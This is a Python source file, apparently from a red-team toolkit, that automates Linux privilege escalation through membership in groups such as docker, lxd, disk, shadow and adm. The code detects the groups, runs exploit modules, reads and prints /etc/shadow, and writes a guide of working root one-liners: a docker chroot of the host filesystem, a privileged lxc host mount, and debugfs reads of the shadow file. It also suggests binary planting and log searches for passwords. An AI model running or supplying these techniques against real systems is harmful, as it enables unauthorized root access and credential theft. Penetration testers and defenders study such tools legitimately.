"""
Group Privilege Escalation Framework
====================================

Main orchestrator for group-based privilege escalation.
"""

import os
import pwd
import grp
import json
import subprocess
from pathlib import Path
from datetime import datetime
from typing import List, Optional, Dict

from .groups import (
    DangerousGroup, GroupFinding, ExploitResult, ExploitStatus,
    GroupScanResult, DANGEROUS_GROUPS, Severity, Difficulty
)
from ..exploits.docker_exploit import DockerExploit
from ..exploits.lxd_exploit import LXDExploit
from ..exploits.disk_exploit import DiskExploit
from ..exploits.video_exploit import VideoExploit


class GroupExploiter:
    """
    Main group privilege escalation framework.

    Discovers dangerous group memberships and exploits them.

    Usage:
        exploiter = GroupExploiter()
        results = exploiter.scan_and_exploit()
        exploiter.save_report(results)
    """

    BANNER = '''
    ╔═══════════════════════════════════════════════════════════════╗
    ║     Group-Based Privilege Escalation Framework                ║
    ║     Part of: 30 Days of Red Team Toolkit                      ║
    ║─────────────────────────────────────────────────────────────────║
    ║     "Groups are just permissions waiting to be exploited."    ║
    ╚═══════════════════════════════════════════════════════════════╝
    '''

    # Map group names to exploit classes
    EXPLOIT_MAP = {
        'docker': DockerExploit,
        'lxd': LXDExploit,
        'lxc': LXDExploit,  # LXC uses same exploit as LXD
        'disk': DiskExploit,
        'video': VideoExploit
    }

    def __init__(self, output_dir: Optional[str] = None, verbose: bool = False):
        """
        Initialize the exploiter.

        Args:
            output_dir: Directory for reports
            verbose: Enable verbose output
        """
        self.verbose = verbose

        # Get current user info
        self.uid = os.getuid()
        self.username = pwd.getpwuid(self.uid).pw_name
        self.user_groups = self._get_user_groups()

        self.output_dir = Path(output_dir) if output_dir else Path("/tmp/group_exploit")
        self.output_dir.mkdir(exist_ok=True, mode=0o755)

        print(self.BANNER)
        print(f"[+] Current user: {self.username} (UID: {self.uid})")
        print(f"[+] Groups: {', '.join(self.user_groups)}")
        print(f"[+] Output directory: {self.output_dir}")

    def _get_user_groups(self) -> List[str]:
        """Get all groups current user belongs to"""
        try:
            result = subprocess.run(
                ['groups'],
                capture_output=True,
                text=True,
                timeout=5
            )

            if result.returncode == 0:
                # Output format: "user : group1 group2 group3"
                groups_str = result.stdout.strip()

                if ':' in groups_str:
                    groups_str = groups_str.split(':')[1]

                return groups_str.split()

            return []
        except:
            return []

    def scan(self) -> GroupScanResult:
        """
        Scan for dangerous group memberships.

        Returns:
            GroupScanResult with findings
        """
        print(f"\n{'=' * 60}")
        print("GROUP MEMBERSHIP ENUMERATION")
        print(f"{'=' * 60}")

        result = GroupScanResult(
            user=self.username,
            uid=self.uid,
            all_groups=self.user_groups
        )

        print(f"\n[*] Checking {len(self.user_groups)} groups against known dangerous groups...")

        # Check each user group against dangerous groups
        for group_name in self.user_groups:
            if group_name in DANGEROUS_GROUPS:
                dangerous_group = DANGEROUS_GROUPS[group_name]

                # Get group info
                try:
                    grp_info = grp.getgrnam(group_name)
                    gid = grp_info.gr_gid
                    members = grp_info.gr_mem
                except:
                    gid = None
                    members = []

                finding = GroupFinding(
                    group=dangerous_group,
                    is_member=True,
                    gid=gid,
                    members=members
                )

                result.findings.append(finding)

                # Print finding
                severity = dangerous_group.severity.value.upper()
                print(f"\n[!] [{severity}] Found: {group_name}")
                print(f"    Description: {dangerous_group.description}")
                print(f"    Impact: {dangerous_group.impact}")
                print(f"    Exploitation: {dangerous_group.exploitation}")

        if not result.findings:
            print(f"\n[-] No dangerous group memberships found")
        else:
            print(f"\n[+] Found {len(result.findings)} dangerous group membership(s)")

        result.print_summary()

        return result

    def exploit(
            self,
            finding: GroupFinding,
            method: Optional[str] = None,
            interactive: bool = False
    ) -> ExploitResult:
        """
        Exploit a specific group membership.

        Args:
            finding: The GroupFinding to exploit
            method: Specific method to use
            interactive: Allow interactive shell

        Returns:
            ExploitResult
        """
        group_name = finding.group.name

        print(f"\n{'=' * 60}")
        print(f"EXPLOITING: {group_name.upper()} GROUP")
        print(f"{'=' * 60}")

        # Get exploit class
        exploit_class = self.EXPLOIT_MAP.get(group_name)

        if not exploit_class:
            # Handle groups without automated exploits
            return self._manual_exploit(finding)

        # Initialize exploit
        exploit = exploit_class(finding, verbose=self.verbose)

        # Check if available
        if not exploit.check_available():
            return ExploitResult(
                finding=finding,
                method="N/A",
                status=ExploitStatus.ERROR,
                error=f"{group_name} exploitation not available"
            )

        # Show available methods
        exploit.print_methods()

        # Execute exploitation
        return exploit.exploit(method=method, interactive=interactive)

    def _manual_exploit(self, finding: GroupFinding) -> ExploitResult:
        """Handle groups without automated exploits"""
        group_name = finding.group.name

        print(f"\n[*] {group_name} group exploitation guidance:")
        print(f"[*] {finding.group.exploitation}")

        # Provide specific guidance
        if group_name in ('sudo', 'wheel'):
            print(f"\n[*] Check sudo permissions:")
            print(f"    sudo -l")

            os.system('sudo -l 2>/dev/null || echo "Cannot check sudo"')

        elif group_name == 'shadow':
            print(f"\n[*] Read shadow file:")
            print(f"    cat /etc/shadow")

            try:
                with open('/etc/shadow', 'r') as f:
                    print(f.read())
            except PermissionError:
                print("[-] Cannot read shadow (unexpected)")

        elif group_name == 'adm':
            print(f"\n[*] Interesting log files:")
            print(f"    /var/log/auth.log - Authentication attempts")
            print(f"    /var/log/syslog - System logs")
            print(f"    /var/log/apache2/*.log - Web server logs")

            print(f"\n[*] Search for credentials:")
            print(f"    grep -r 'password' /var/log/ 2>/dev/null")

        elif group_name == 'staff':
            print(f"\n[*] Writable directories:")
            print(f"    /usr/local/bin - Binary planting")
            print(f"    /usr/local/lib - Library hijacking")

        return ExploitResult(
            finding=finding,
            method="manual",
            status=ExploitStatus.MANUAL,
            output=f"Manual exploitation required for {group_name}"
        )

    def scan_and_exploit(
            self,
            interactive: bool = False,
            stop_on_success: bool = True
    ) -> GroupScanResult:
        """
        Scan for groups and exploit vulnerabilities.

        Args:
            interactive: Allow interactive shells
            stop_on_success: Stop after first successful root

        Returns:
            GroupScanResult with exploitation results
        """
        print(f"\n{'=' * 60}")
        print("AUTOMATED GROUP EXPLOITATION")
        print(f"{'=' * 60}")

        # Scan first
        result = self.scan()

        if not result.findings:
            print(f"\n[-] No exploitable groups found")
            return result

        # Sort by severity and success rate
        sorted_findings = sorted(
            result.findings,
            key=lambda f: (
                f.group.severity != Severity.CRITICAL,
                f.group.severity != Severity.HIGH,
                -f.group.success_rate
            )
        )

        # Exploitation phase
        print(f"\n{'=' * 60}")
        print("EXPLOITATION PHASE")
        print(f"{'=' * 60}")

        for finding in sorted_findings:
            exploit_result = self.exploit(
                finding=finding,
                interactive=interactive
            )

            result.exploit_results.append(exploit_result)

            if exploit_result.got_root and stop_on_success:
                print(f"\n[+] ROOT ACCESS ACHIEVED via {finding.group.name}!")
                break

        return result

    def exploit_specific(
            self,
            group_name: str,
            method: Optional[str] = None,
            interactive: bool = False
    ) -> ExploitResult:
        """
        Exploit a specific group by name.

        Args:
            group_name: Name of the group to exploit
            method: Specific method to use
            interactive: Allow interactive shell

        Returns:
            ExploitResult
        """
        # Check if user is in group
        if group_name not in self.user_groups:
            print(f"[-] User is not in '{group_name}' group")
            return ExploitResult(
                finding=GroupFinding(
                    group=DANGEROUS_GROUPS.get(group_name, DangerousGroup(
                        name=group_name,
                        description="Unknown group",
                        impact="Unknown",
                        severity=Severity.LOW,
                        difficulty=Difficulty.MEDIUM,
                        exploitation="Unknown"
                    )),
                    is_member=False
                ),
                method="N/A",
                status=ExploitStatus.ERROR,
                error=f"User not in {group_name} group"
            )

        # Create finding
        if group_name in DANGEROUS_GROUPS:
            dangerous_group = DANGEROUS_GROUPS[group_name]
        else:
            dangerous_group = DangerousGroup(
                name=group_name,
                description=f"Unknown group: {group_name}",
                impact="Unknown",
                severity=Severity.MEDIUM,
                difficulty=Difficulty.MEDIUM,
                exploitation="Manual investigation required"
            )

        finding = GroupFinding(
            group=dangerous_group,
            is_member=True
        )

        return self.exploit(finding, method=method, interactive=interactive)

    def save_report(self, result: GroupScanResult, filename: str = "group_report.json") -> Path:
        """Save scan results to JSON"""
        report_path = self.output_dir / filename

        with open(report_path, 'w') as f:
            json.dump(result.to_dict(), f, indent=2)

        print(f"\n[+] Report saved: {report_path}")

        return report_path

    def generate_exploit_guide(self, result: GroupScanResult) -> Path:
        """Generate quick exploitation guide"""
        guide_path = self.output_dir / "exploit_guide.txt"

        with open(guide_path, 'w') as f:
            f.write("GROUP PRIVILEGE ESCALATION GUIDE\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"User: {result.user} (UID: {result.uid})\n")
            f.write(f"Groups: {', '.join(result.all_groups)}\n\n")

            if result.findings:
                f.write("DANGEROUS GROUP MEMBERSHIPS\n")
                f.write("-" * 60 + "\n\n")

                for finding in result.findings:
                    g = finding.group
                    f.write(f"[{g.severity.value.upper()}] {g.name}\n")
                    f.write(f"Impact: {g.impact}\n")
                    f.write(f"Exploitation: {g.exploitation}\n")
                    f.write(f"Success Rate: {g.success_rate * 100:.0f}%\n\n")

                    # Add quick commands
                    if g.name == 'docker':
                        f.write("Quick Root:\n")
                        f.write("  docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n\n")
                    elif g.name in ('lxd', 'lxc'):
                        f.write("Quick Root:\n")
                        f.write("  lxc init images:alpine/edge privesc -c security.privileged=true\n")
                        f.write("  lxc config device add privesc host disk source=/ path=/mnt/root recursive=true\n")
                        f.write("  lxc start privesc && lxc exec privesc /bin/sh\n\n")
                    elif g.name == 'disk':
                        f.write("Read Shadow:\n")
                        f.write("  debugfs -R 'cat /etc/shadow' /dev/sda1\n\n")
            else:
                f.write("No dangerous group memberships found.\n")

        print(f"[+] Exploit guide saved: {guide_path}")

        return guide_path

    def list_groups(self) -> None:
        """List all known dangerous groups"""
        print(f"\n{'=' * 60}")
        print("KNOWN DANGEROUS GROUPS")
        print(f"{'=' * 60}")

        for name, group in sorted(DANGEROUS_GROUPS.items(),
                                  key=lambda x: (x[1].severity.value, x[0])):
            in_group = "✓" if name in self.user_groups else " "
            print(f"\n[{in_group}] {name} [{group.severity.value.upper()}]")
            print(f"    {group.description}")
            print(f"    Impact: {group.impact}")